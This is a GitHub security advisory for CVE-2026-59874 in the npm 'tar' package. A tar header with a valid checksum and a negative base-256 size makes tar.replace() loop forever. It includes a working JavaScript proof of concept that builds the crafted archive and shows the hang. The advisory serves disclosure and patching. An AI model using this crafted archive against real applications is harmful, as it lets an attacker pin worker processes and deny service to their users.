# [H] node-tar: Negative tar entry size causes infinite loop in archive replace

## Summary
Severity: High
Advisory: GHSA-8x88-c5mf-7j5w
CVE: CVE-2026-59874
CWE: CWE-835
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-07-20
Source: https://github.com/advisories/GHSA-8x88-c5mf-7j5w
Type: github-advisory

## Affected
- npm: `tar` — affected >=0 <7.5.18

## Details
### Summary

A checksum-valid tar archive with a negative base-256 encoded entry size can make `tar.replace()` loop forever while scanning the existing archive. Applications that update attacker-controlled tar archives can have a worker process pinned indefinitely, causing denial of service.

### Details

The public `tar.replace()` API scans the existing archive before appending replacement entries. During this scan, it parses each tar header and advances the archive position by the parsed entry size rounded to a 512-byte block boundary.

Tar supports base-256 encoded numeric fields. A crafted header can encode the entry size as `-512` while still carrying a valid checksum. The replace scan accepts that parsed negative size and uses it in the position-advance calculation.

For a size of `-512`, the computed body skip is `-512`. The scan then adds the normal 512-byte header step, resulting in no net progress. The scanner repeatedly parses the same header forever and never reaches the append step.

This is reachable through the supported package API when the existing archive file is attacker controlled. It does not rely on extraction, dependency behavior, or an uncaught exception.

### PoC

Save as `poc.mjs` in a project with the vulnerable package installed and run:

```bash
node poc.mjs
```

```js
import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import { spawnSync } from 'node:child_process'

const oct = (b, n, off, len) =>
  b.write(n.toString(8).padStart(len - 1, '0') + '\0', off, len, 'ascii')

const badHeader = () => {
  const h = Buffer.alloc(512)

  h.write('x', 0)
  oct(h, 0o644, 100, 8)
  oct(h, 0, 108, 8)
  oct(h, 0, 116, 8)

  // base-256 encoded -512 in the size field
  Buffer.alloc(10, 0xff).copy(h, 124)
  h[134] = 0xfe
  h[135] = 0x00

  oct(h, 0, 136, 12)
  h.fill(0x20, 148, 156)
  h[156] = 0x30
  h.write('ustar\0' + '00', 257, 8, 'binary')

  let sum = 0
  for (const c of h) sum += c
  h.write(sum.toString(8).padStart(6, '0') + '\0 ', 148, 8, 'ascii')

  return h
}

const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'tar-loop-'))
const file = path.join(dir, 'poc.tar')

fs.writeFileSync(file, badHeader())
fs.writeFileSync(path.join(dir, 'add.txt'), 'x')

const r = spawnSync(
  process.execPath,
  [
    '--input-type=module',
    '-e',
    `
      import * as tar from 'tar'
      tar.replace({ file: ${JSON.stringify(file)}, cwd: ${JSON.stringify(dir)}, sync: true }, ['add.txt'])
      console.log('completed')
    `,
  ],
  { timeout: 20_000 }
)

console.log(r.error?.code === 'ETIMEDOUT')

// Output: true
```

### Impact

An application that calls `tar.replace()` on an existing archive supplied or controlled by an attacker can be forced into a non-terminating archive scan. This can consume a worker process indefinitely and cause denial of service. Plain extraction-only workflows are not affected by this finding.

## References
- https://github.com/isaacs/node-tar/security/advisories/GHSA-8x88-c5mf-7j5w
- https://nvd.nist.gov/vuln/detail/CVE-2026-59874
- https://github.com/isaacs/node-tar/commit/9e78bf058b2c22dd4d52e00d8922d5c06fc2f7b5
- https://github.com/isaacs/node-tar
- https://github.com/isaacs/node-tar/releases/tag/v7.5.18
